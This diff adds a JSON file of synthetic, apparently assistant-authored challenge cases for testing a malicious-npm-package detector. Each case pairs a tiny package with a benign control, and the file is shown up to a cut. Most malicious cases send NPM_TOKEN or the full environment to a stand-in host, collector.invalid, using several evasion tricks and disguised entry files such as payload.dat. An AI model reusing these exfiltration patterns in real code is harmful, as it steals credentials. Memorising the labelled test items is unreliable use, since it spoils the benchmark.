@@ -1,0 +1,2526 @@
+{
+  "schemaVersion": 1,
+  "provenance": "Synthetic, assistant-authored paired challenge cases. Labels fixed before initial execution. Not independently reviewed or sampled from prevalence data. Never execute sourceFiles.",
+  "cases": [
+    {
+      "id": "single-secret/malicious/entry",
+      "family": "single-secret",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "A credential value is sent off-host; control sends a fixed health signal.",
+      "evidence": {
+        "packageName": "challenge-single-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-single-secret\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://collector.invalid', {method:'POST',body:process.env.NPM_TOKEN});"
+        }
+      }
+    },
+    {
+      "id": "single-secret/malicious/test-named-entry",
+      "family": "single-secret",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "A credential value is sent off-host; control sends a fixed health signal.",
+      "evidence": {
+        "packageName": "challenge-single-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-single-secret\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "fetch('https://collector.invalid', {method:'POST',body:process.env.NPM_TOKEN});"
+        }
+      }
+    },
+    {
+      "id": "single-secret/malicious/custom-extension-entry",
+      "family": "single-secret",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "A credential value is sent off-host; control sends a fixed health signal.",
+      "evidence": {
+        "packageName": "challenge-single-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-single-secret\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "fetch('https://collector.invalid', {method:'POST',body:process.env.NPM_TOKEN});"
+        }
+      }
+    },
+    {
+      "id": "single-secret/benign/entry",
+      "family": "single-secret",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "A credential value is sent off-host; control sends a fixed health signal.",
+      "evidence": {
+        "packageName": "challenge-single-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-single-secret\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const token = process.env.NPM_TOKEN; fetch('https://service.invalid/health', {method:'POST',body:'ready'});"
+        }
+      }
+    },
+    {
+      "id": "single-secret/benign/test-named-entry",
+      "family": "single-secret",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "A credential value is sent off-host; control sends a fixed health signal.",
+      "evidence": {
+        "packageName": "challenge-single-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-single-secret\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const token = process.env.NPM_TOKEN; fetch('https://service.invalid/health', {method:'POST',body:'ready'});"
+        }
+      }
+    },
+    {
+      "id": "single-secret/benign/custom-extension-entry",
+      "family": "single-secret",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "A credential value is sent off-host; control sends a fixed health signal.",
+      "evidence": {
+        "packageName": "challenge-single-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-single-secret\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const token = process.env.NPM_TOKEN; fetch('https://service.invalid/health', {method:'POST',body:'ready'});"
+        }
+      }
+    },
+    {
+      "id": "computed-env/malicious/entry",
+      "family": "computed-env",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Computed property access preserves the credential-to-network flow.",
+      "evidence": {
+        "packageName": "challenge-computed-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-computed-env\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://collector.invalid', {method:'POST',body:process['env']['NPM_TOKEN']});"
+        }
+      }
+    },
+    {
+      "id": "computed-env/malicious/test-named-entry",
+      "family": "computed-env",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Computed property access preserves the credential-to-network flow.",
+      "evidence": {
+        "packageName": "challenge-computed-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-computed-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "fetch('https://collector.invalid', {method:'POST',body:process['env']['NPM_TOKEN']});"
+        }
+      }
+    },
+    {
+      "id": "computed-env/malicious/custom-extension-entry",
+      "family": "computed-env",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Computed property access preserves the credential-to-network flow.",
+      "evidence": {
+        "packageName": "challenge-computed-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-computed-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "fetch('https://collector.invalid', {method:'POST',body:process['env']['NPM_TOKEN']});"
+        }
+      }
+    },
+    {
+      "id": "computed-env/benign/entry",
+      "family": "computed-env",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Computed property access preserves the credential-to-network flow.",
+      "evidence": {
+        "packageName": "challenge-computed-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-computed-env\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "console.log(Boolean(process['env']['NPM_TOKEN']));"
+        }
+      }
+    },
+    {
+      "id": "computed-env/benign/test-named-entry",
+      "family": "computed-env",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Computed property access preserves the credential-to-network flow.",
+      "evidence": {
+        "packageName": "challenge-computed-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-computed-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "console.log(Boolean(process['env']['NPM_TOKEN']));"
+        }
+      }
+    },
+    {
+      "id": "computed-env/benign/custom-extension-entry",
+      "family": "computed-env",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Computed property access preserves the credential-to-network flow.",
+      "evidence": {
+        "packageName": "challenge-computed-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-computed-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "console.log(Boolean(process['env']['NPM_TOKEN']));"
+        }
+      }
+    },
+    {
+      "id": "aliased-env/malicious/entry",
+      "family": "aliased-env",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "An environment alias carries credentials into a POST.",
+      "evidence": {
+        "packageName": "challenge-aliased-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-aliased-env\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const settings=process.env; fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(settings)});"
+        }
+      }
+    },
+    {
+      "id": "aliased-env/malicious/test-named-entry",
+      "family": "aliased-env",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "An environment alias carries credentials into a POST.",
+      "evidence": {
+        "packageName": "challenge-aliased-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-aliased-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const settings=process.env; fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(settings)});"
+        }
+      }
+    },
+    {
+      "id": "aliased-env/malicious/custom-extension-entry",
+      "family": "aliased-env",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "An environment alias carries credentials into a POST.",
+      "evidence": {
+        "packageName": "challenge-aliased-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-aliased-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const settings=process.env; fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(settings)});"
+        }
+      }
+    },
+    {
+      "id": "aliased-env/benign/entry",
+      "family": "aliased-env",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "An environment alias carries credentials into a POST.",
+      "evidence": {
+        "packageName": "challenge-aliased-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-aliased-env\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const settings=process.env; console.log(settings.NODE_ENV);"
+        }
+      }
+    },
+    {
+      "id": "aliased-env/benign/test-named-entry",
+      "family": "aliased-env",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "An environment alias carries credentials into a POST.",
+      "evidence": {
+        "packageName": "challenge-aliased-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-aliased-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const settings=process.env; console.log(settings.NODE_ENV);"
+        }
+      }
+    },
+    {
+      "id": "aliased-env/benign/custom-extension-entry",
+      "family": "aliased-env",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "An environment alias carries credentials into a POST.",
+      "evidence": {
+        "packageName": "challenge-aliased-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-aliased-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const settings=process.env; console.log(settings.NODE_ENV);"
+        }
+      }
+    },
+    {
+      "id": "destructured-secret/malicious/entry",
+      "family": "destructured-secret",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Destructured credentials flow to fetch.",
+      "evidence": {
+        "packageName": "challenge-destructured-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-destructured-secret\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const {NPM_TOKEN:token}=process.env; fetch('https://collector.invalid', {method:'POST',body:token});"
+        }
+      }
+    },
+    {
+      "id": "destructured-secret/malicious/test-named-entry",
+      "family": "destructured-secret",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Destructured credentials flow to fetch.",
+      "evidence": {
+        "packageName": "challenge-destructured-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-destructured-secret\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const {NPM_TOKEN:token}=process.env; fetch('https://collector.invalid', {method:'POST',body:token});"
+        }
+      }
+    },
+    {
+      "id": "destructured-secret/malicious/custom-extension-entry",
+      "family": "destructured-secret",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Destructured credentials flow to fetch.",
+      "evidence": {
+        "packageName": "challenge-destructured-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-destructured-secret\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const {NPM_TOKEN:token}=process.env; fetch('https://collector.invalid', {method:'POST',body:token});"
+        }
+      }
+    },
+    {
+      "id": "destructured-secret/benign/entry",
+      "family": "destructured-secret",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Destructured credentials flow to fetch.",
+      "evidence": {
+        "packageName": "challenge-destructured-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-destructured-secret\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const {NODE_ENV:mode}=process.env; fetch('https://service.invalid/health', {method:'POST',body:mode});"
+        }
+      }
+    },
+    {
+      "id": "destructured-secret/benign/test-named-entry",
+      "family": "destructured-secret",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Destructured credentials flow to fetch.",
+      "evidence": {
+        "packageName": "challenge-destructured-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-destructured-secret\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const {NODE_ENV:mode}=process.env; fetch('https://service.invalid/health', {method:'POST',body:mode});"
+        }
+      }
+    },
+    {
+      "id": "destructured-secret/benign/custom-extension-entry",
+      "family": "destructured-secret",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Destructured credentials flow to fetch.",
+      "evidence": {
+        "packageName": "challenge-destructured-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-destructured-secret\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const {NODE_ENV:mode}=process.env; fetch('https://service.invalid/health', {method:'POST',body:mode});"
+        }
+      }
+    },
+    {
+      "id": "spread-env/malicious/entry",
+      "family": "spread-env",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Full environment is copied and exported, versus fixed configuration.",
+      "evidence": {
+        "packageName": "challenge-spread-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-spread-env\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const copy={...process.env}; fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(copy)});"
+        }
+      }
+    },
+    {
+      "id": "spread-env/malicious/test-named-entry",
+      "family": "spread-env",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Full environment is copied and exported, versus fixed configuration.",
+      "evidence": {
+        "packageName": "challenge-spread-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-spread-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const copy={...process.env}; fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(copy)});"
+        }
+      }
+    },
+    {
+      "id": "spread-env/malicious/custom-extension-entry",
+      "family": "spread-env",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Full environment is copied and exported, versus fixed configuration.",
+      "evidence": {
+        "packageName": "challenge-spread-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-spread-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const copy={...process.env}; fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(copy)});"
+        }
+      }
+    },
+    {
+      "id": "spread-env/benign/entry",
+      "family": "spread-env",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Full environment is copied and exported, versus fixed configuration.",
+      "evidence": {
+        "packageName": "challenge-spread-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-spread-env\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const copy={mode:process.env.NODE_ENV}; fetch('https://service.invalid', {method:'POST',body:JSON.stringify(copy)});"
+        }
+      }
+    },
+    {
+      "id": "spread-env/benign/test-named-entry",
+      "family": "spread-env",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Full environment is copied and exported, versus fixed configuration.",
+      "evidence": {
+        "packageName": "challenge-spread-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-spread-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const copy={mode:process.env.NODE_ENV}; fetch('https://service.invalid', {method:'POST',body:JSON.stringify(copy)});"
+        }
+      }
+    },
+    {
+      "id": "spread-env/benign/custom-extension-entry",
+      "family": "spread-env",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Full environment is copied and exported, versus fixed configuration.",
+      "evidence": {
+        "packageName": "challenge-spread-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-spread-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const copy={mode:process.env.NODE_ENV}; fetch('https://service.invalid', {method:'POST',body:JSON.stringify(copy)});"
+        }
+      }
+    },
+    {
+      "id": "assign-env/malicious/entry",
+      "family": "assign-env",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Object.assign carries all environment variables, versus fixed configuration.",
+      "evidence": {
+        "packageName": "challenge-assign-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-assign-env\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const copy=Object.assign({},process.env); fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(copy)});"
+        }
+      }
+    },
+    {
+      "id": "assign-env/malicious/test-named-entry",
+      "family": "assign-env",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Object.assign carries all environment variables, versus fixed configuration.",
+      "evidence": {
+        "packageName": "challenge-assign-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-assign-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const copy=Object.assign({},process.env); fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(copy)});"
+        }
+      }
+    },
+    {
+      "id": "assign-env/malicious/custom-extension-entry",
+      "family": "assign-env",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Object.assign carries all environment variables, versus fixed configuration.",
+      "evidence": {
+        "packageName": "challenge-assign-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-assign-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const copy=Object.assign({},process.env); fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(copy)});"
+        }
+      }
+    },
+    {
+      "id": "assign-env/benign/entry",
+      "family": "assign-env",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Object.assign carries all environment variables, versus fixed configuration.",
+      "evidence": {
+        "packageName": "challenge-assign-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-assign-env\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const copy=Object.assign({}, {mode:'production'}); fetch('https://service.invalid', {method:'POST',body:JSON.stringify(copy)});"
+        }
+      }
+    },
+    {
+      "id": "assign-env/benign/test-named-entry",
+      "family": "assign-env",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Object.assign carries all environment variables, versus fixed configuration.",
+      "evidence": {
+        "packageName": "challenge-assign-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-assign-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const copy=Object.assign({}, {mode:'production'}); fetch('https://service.invalid', {method:'POST',body:JSON.stringify(copy)});"
+        }
+      }
+    },
+    {
+      "id": "assign-env/benign/custom-extension-entry",
+      "family": "assign-env",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Object.assign carries all environment variables, versus fixed configuration.",
+      "evidence": {
+        "packageName": "challenge-assign-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-assign-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const copy=Object.assign({}, {mode:'production'}); fetch('https://service.invalid', {method:'POST',body:JSON.stringify(copy)});"
+        }
+      }
+    },
+    {
+      "id": "entries-env/malicious/entry",
+      "family": "entries-env",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "All environment entries leave the process; control exports a harmless constant.",
+      "evidence": {
+        "packageName": "challenge-entries-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-entries-env\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(Object.entries(process.env))});"
+        }
+      }
+    },
+    {
+      "id": "entries-env/malicious/test-named-entry",
+      "family": "entries-env",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "All environment entries leave the process; control exports a harmless constant.",
+      "evidence": {
+        "packageName": "challenge-entries-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-entries-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(Object.entries(process.env))});"
+        }
+      }
+    },
+    {
+      "id": "entries-env/malicious/custom-extension-entry",
+      "family": "entries-env",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "All environment entries leave the process; control exports a harmless constant.",
+      "evidence": {
+        "packageName": "challenge-entries-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-entries-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(Object.entries(process.env))});"
+        }
+      }
+    },
+    {
+      "id": "entries-env/benign/entry",
+      "family": "entries-env",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "All environment entries leave the process; control exports a harmless constant.",
+      "evidence": {
+        "packageName": "challenge-entries-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-entries-env\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://service.invalid', {method:'POST',body:JSON.stringify(Object.entries({status:'ready'}))});"
+        }
+      }
+    },
+    {
+      "id": "entries-env/benign/test-named-entry",
+      "family": "entries-env",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "All environment entries leave the process; control exports a harmless constant.",
+      "evidence": {
+        "packageName": "challenge-entries-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-entries-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "fetch('https://service.invalid', {method:'POST',body:JSON.stringify(Object.entries({status:'ready'}))});"
+        }
+      }
+    },
+    {
+      "id": "entries-env/benign/custom-extension-entry",
+      "family": "entries-env",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "All environment entries leave the process; control exports a harmless constant.",
+      "evidence": {
+        "packageName": "challenge-entries-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-entries-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "fetch('https://service.invalid', {method:'POST',body:JSON.stringify(Object.entries({status:'ready'}))});"
+        }
+      }
+    },
+    {
+      "id": "reflect-env/malicious/entry",
+      "family": "reflect-env",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Reflection hides the bulk environment source.",
+      "evidence": {
+        "packageName": "challenge-reflect-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-reflect-env\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(Reflect.get(process,'env'))});"
+        }
+      }
+    },
+    {
+      "id": "reflect-env/malicious/test-named-entry",
+      "family": "reflect-env",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Reflection hides the bulk environment source.",
+      "evidence": {
+        "packageName": "challenge-reflect-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-reflect-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(Reflect.get(process,'env'))});"
+        }
+      }
+    },
+    {
+      "id": "reflect-env/malicious/custom-extension-entry",
+      "family": "reflect-env",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Reflection hides the bulk environment source.",
+      "evidence": {
+        "packageName": "challenge-reflect-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-reflect-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "fetch('https://collector.invalid', {method:'POST',body:JSON.stringify(Reflect.get(process,'env'))});"
+        }
+      }
+    },
+    {
+      "id": "reflect-env/benign/entry",
+      "family": "reflect-env",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Reflection hides the bulk environment source.",
+      "evidence": {
+        "packageName": "challenge-reflect-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-reflect-env\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://service.invalid', {method:'POST',body:JSON.stringify(Reflect.get({status:'ready'},'status'))});"
+        }
+      }
+    },
+    {
+      "id": "reflect-env/benign/test-named-entry",
+      "family": "reflect-env",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Reflection hides the bulk environment source.",
+      "evidence": {
+        "packageName": "challenge-reflect-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-reflect-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "fetch('https://service.invalid', {method:'POST',body:JSON.stringify(Reflect.get({status:'ready'},'status'))});"
+        }
+      }
+    },
+    {
+      "id": "reflect-env/benign/custom-extension-entry",
+      "family": "reflect-env",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Reflection hides the bulk environment source.",
+      "evidence": {
+        "packageName": "challenge-reflect-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-reflect-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "fetch('https://service.invalid', {method:'POST',body:JSON.stringify(Reflect.get({status:'ready'},'status'))});"
+        }
+      }
+    },
+    {
+      "id": "secret-query/malicious/entry",
+      "family": "secret-query",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Credential exfiltration in URL query rather than request body.",
+      "evidence": {
+        "packageName": "challenge-secret-query",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-secret-query\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://collector.invalid/?token='+encodeURIComponent(process.env.NPM_TOKEN));"
+        }
+      }
+    },
+    {
+      "id": "secret-query/malicious/test-named-entry",
+      "family": "secret-query",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Credential exfiltration in URL query rather than request body.",
+      "evidence": {
+        "packageName": "challenge-secret-query",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-secret-query\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "fetch('https://collector.invalid/?token='+encodeURIComponent(process.env.NPM_TOKEN));"
+        }
+      }
+    },
+    {
+      "id": "secret-query/malicious/custom-extension-entry",
+      "family": "secret-query",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Credential exfiltration in URL query rather than request body.",
+      "evidence": {
+        "packageName": "challenge-secret-query",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-secret-query\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "fetch('https://collector.invalid/?token='+encodeURIComponent(process.env.NPM_TOKEN));"
+        }
+      }
+    },
+    {
+      "id": "secret-query/benign/entry",
+      "family": "secret-query",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Credential exfiltration in URL query rather than request body.",
+      "evidence": {
+        "packageName": "challenge-secret-query",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-secret-query\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://service.invalid/?mode='+encodeURIComponent(process.env.NODE_ENV));"
+        }
+      }
+    },
+    {
+      "id": "secret-query/benign/test-named-entry",
+      "family": "secret-query",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Credential exfiltration in URL query rather than request body.",
+      "evidence": {
+        "packageName": "challenge-secret-query",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-secret-query\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "fetch('https://service.invalid/?mode='+encodeURIComponent(process.env.NODE_ENV));"
+        }
+      }
+    },
+    {
+      "id": "secret-query/benign/custom-extension-entry",
+      "family": "secret-query",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Credential exfiltration in URL query rather than request body.",
+      "evidence": {
+        "packageName": "challenge-secret-query",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-secret-query\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "fetch('https://service.invalid/?mode='+encodeURIComponent(process.env.NODE_ENV));"
+        }
+      }
+    },
+    {
+      "id": "secret-urlparams/malicious/entry",
+      "family": "secret-urlparams",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Credential sent through URLSearchParams.",
+      "evidence": {
+        "packageName": "challenge-secret-urlparams",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-secret-urlparams\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const q=new URLSearchParams({token:process.env.NPM_TOKEN}); fetch('https://collector.invalid/?'+q);"
+        }
+      }
+    },
+    {
+      "id": "secret-urlparams/malicious/test-named-entry",
+      "family": "secret-urlparams",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Credential sent through URLSearchParams.",
+      "evidence": {
+        "packageName": "challenge-secret-urlparams",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-secret-urlparams\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const q=new URLSearchParams({token:process.env.NPM_TOKEN}); fetch('https://collector.invalid/?'+q);"
+        }
+      }
+    },
+    {
+      "id": "secret-urlparams/malicious/custom-extension-entry",
+      "family": "secret-urlparams",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Credential sent through URLSearchParams.",
+      "evidence": {
+        "packageName": "challenge-secret-urlparams",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-secret-urlparams\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const q=new URLSearchParams({token:process.env.NPM_TOKEN}); fetch('https://collector.invalid/?'+q);"
+        }
+      }
+    },
+    {
+      "id": "secret-urlparams/benign/entry",
+      "family": "secret-urlparams",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Credential sent through URLSearchParams.",
+      "evidence": {
+        "packageName": "challenge-secret-urlparams",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-secret-urlparams\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const q=new URLSearchParams({mode:process.env.NODE_ENV}); fetch('https://service.invalid/?'+q);"
+        }
+      }
+    },
+    {
+      "id": "secret-urlparams/benign/test-named-entry",
+      "family": "secret-urlparams",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Credential sent through URLSearchParams.",
+      "evidence": {
